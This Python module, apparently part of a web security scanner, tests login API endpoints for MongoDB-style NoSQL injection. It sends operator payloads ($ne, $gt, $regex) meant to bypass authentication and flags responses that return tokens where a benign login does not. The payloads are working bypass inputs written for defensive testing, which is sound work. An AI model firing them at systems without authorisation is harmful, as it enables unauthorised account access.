"""NoSQL injection (MongoDB-style operator payloads)."""
from .base import BaseCheck
from ..models import Finding
from ..utils import run


class NoSQLInjectionCheck(BaseCheck):
    """Probe JSON-accepting endpoints with Mongo-style operators."""

    name = "NoSQL Injection"
    description = "Test APIs for MongoDB-style NoSQL injection"

    LOGIN_PATHS = [
        "/api/login", "/api/auth/login", "/api/v1/login", "/login",
        "/api/users/login", "/auth", "/signin",
    ]

    NOSQL_PAYLOADS = [
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        '{"username": "admin", "password": {"$regex": ".*"}}',
    ]

    SUCCESS_INDICATORS = [
        '"token":', '"access_token":', '"session":', '"jwt":',
        '"success":true', '"authenticated":true', '"login":true',
    ]

    BENIGN_LOGIN = '{"username": "nosqlprobe7x7", "password": "nosqlprobe7x7"}'

    def _post_json(self, url: str, body: str) -> str:
        rc, out, _ = run(
            ["curl", "-s", "--max-time", "6",
             "-X", "POST",
             "-H", "Content-Type: application/json",
             "-d", body, url],
            timeout=10,
        )
        return out if rc == 0 and out else ""

    def execute(self) -> list[Finding]:
        for base in self._hosts():
            for path in self.LOGIN_PATHS:
                url = f"{base}{path}"
                # Baseline: a benign login attempt that should fail. Record
                # which success-indicator strings appear in that failure
                # response - they are template echoes, not successes.
                baseline = self._post_json(url, self.BENIGN_LOGIN).lower()
                if not baseline:
                    continue
                baseline_hits = {s for s in self.SUCCESS_INDICATORS
                                  if s in baseline}

                for payload in self.NOSQL_PAYLOADS:
                    body = self._post_json(url, payload)
                    if not body or len(body) < 10:
                        continue
                    body_lower = body.lower()
                    # Require an indicator that is NOT in the baseline
                    # (so we don't fire on APIs that always echo "token": null
                    # or document a JSON schema in their error pages).
                    for indicator in self.SUCCESS_INDICATORS:
                        if indicator in baseline_hits:
                            continue
                        if indicator in body_lower:
                            self.findings.append(Finding(
                                severity="critical",
                                title="NoSQL Injection - Authentication Bypass",
                                host=base,
                                detail=(
                                    f"MongoDB operator payload yields '{indicator}' "
                                    f"at {url}. Benign login did NOT, so the "
                                    f"NoSQL operator bypassed the credential check."
                                ),
                                source="nosql_injection",
                                url=url,
                                evidence=payload,
                            ))
                            return self.findings
        return self.findings
